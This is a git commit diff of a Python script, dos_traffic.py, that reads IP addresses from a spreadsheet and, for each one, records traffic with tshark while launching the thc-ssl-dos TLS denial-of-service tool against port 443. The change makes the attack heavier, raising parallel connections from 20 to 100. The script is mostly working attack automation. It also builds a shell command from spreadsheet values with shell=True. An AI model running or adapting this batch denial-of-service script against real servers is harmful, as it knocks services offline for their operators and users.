78fc695d1e6dc05f7b3153e95b6281f6209e6f2d
Ng Jun Yang <ju-nyang@live.com>
2019-08-03 11:46:27 +0800

    updated dos_traffic script to be faster

--- dos_traffic.py
+++ dos_traffic.py
@@ -13,16 +13,17 @@ logging.basicConfig(filename='dos_traffic.log', level=logging.INFO, format='%(as
 excel_dir = "./report_unique_servers2.xlsx"
 df = pd.read_excel(excel_dir, sheet_name="thc-tls-dos")
 
-domains = []
-failed_domain = []
+dictionary = {}
+ip_list = df['IP']
 
-domain = df['Domain']
+# Initializing the dictionary to be able to retrieve the names easily
+for index, row in df.iterrows():
+    domain = row['Domain']
+    ip = row['IP']
 
-for row in domain:
-    if row not in domains:
-        domains.append(row)
-    else:
-        continue
+    dictionary[ip] = domain
+
+logging.basicConfig(filename='dos_traffic.log', level=logging.INFO, format='%(asctime)s-%(levelname)s-%(message)s')
 
 
 file_path = os.path.join("output/dos_traffic/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
@@ -30,69 +31,35 @@ if not os.path.exists(file_path):
     os.makedirs(file_path)
 
 
-def clean_domain(url):
-    if "https://" in url:
-        result = url[8:]
-    elif "http://" in url:
-        result = url[7:]
-    else:
-        result = url
-
-    if "/" in result:
-        result = result.split("/")[0]
-
-    return result
-
-
 # For each website: resolve the IP address to add into kali-linux thc-ssl-dos
-for website in domains:
-    domain_socket = clean_domain(website)
-
-    # Getting list of possible ip from the particular domain
-    ip_list = []
-    try:
-        socket_info = socket.getaddrinfo(domain_socket, None)
-    except socket.gaierror as e:
-        logging.error(str(e) + " " + str(domain_socket))
-        failed_domain.append(domain_socket)
-        continue
-
-    # Appending possible IP to input from the domain
-    for info in socket_info:
-        ip = info[4][0]
-        if ip not in ip_list and ":" not in ip:
-            ip_list.append(ip)
-
-    logging.info("Testing this IP " + ip_list[0])
-
+for ip in ip_list:
     # Initializer for tshark
     # SNIFFER
     # Declaring variables for the sniffer
     # Capture filter ip_list[0] is taken as the first IP resolved to capture
     # Might not be too perfect in the case
+    logging.info('Currently testing ' + ip)
     abspath = os.path.abspath(file_path)
     interface = "eth0"
-    capture_filter = "tcp port 443 and host " + ip_list[0]
-    temp = domain_socket.rfind(".")
-    web_name = domain_socket[:temp]
-    filename = abspath + "/" + web_name + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
+    capture_filter = "tcp port 443 and host " + ip
+    filename = abspath + "/" + dictionary[ip] + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
 
     # Raw capturing
-    sniff_command = ["tshark", "-i", interface, "-c 10000", "-f", capture_filter, "-w", filename]
+    sniff_command = ["tshark", "-i", interface, "-c 5000", "-f", capture_filter, "-w", filename]
     sniff_process = subprocess.Popen(sniff_command, shell=False)
     logging.info("Opened tshark sniffer")
 
     # Initializer for thc-ssl-dos
     # Declaring variables for thc-ssl-dos
-    parallel_connections = 20
+    parallel_connections = 100
     port = 443
 
-    thc_command = "thc-ssl-dos -l " + str(parallel_connections) + " " + ip_list[0] + " " + str(port) + " " + "--accept"
+    thc_command = "thc-ssl-dos -l " + str(parallel_connections) + " " + ip + " " + str(port) + " " + "--accept"
     GNULL = open(os.devnull, 'w')
     thc_process = subprocess.Popen(thc_command, shell=True, stdout=GNULL)
     logging.info("Opened DOS attack")
 
-    # Sleeping for 10 seconds before killing them off
+    # Sleeping for 25 seconds before killing them off
     time.sleep(25)
     kill_thc = "killall -s SIGTERM thc-ssl-dos"
     kill_sniff = "killall -s SIGTERM  tshark"
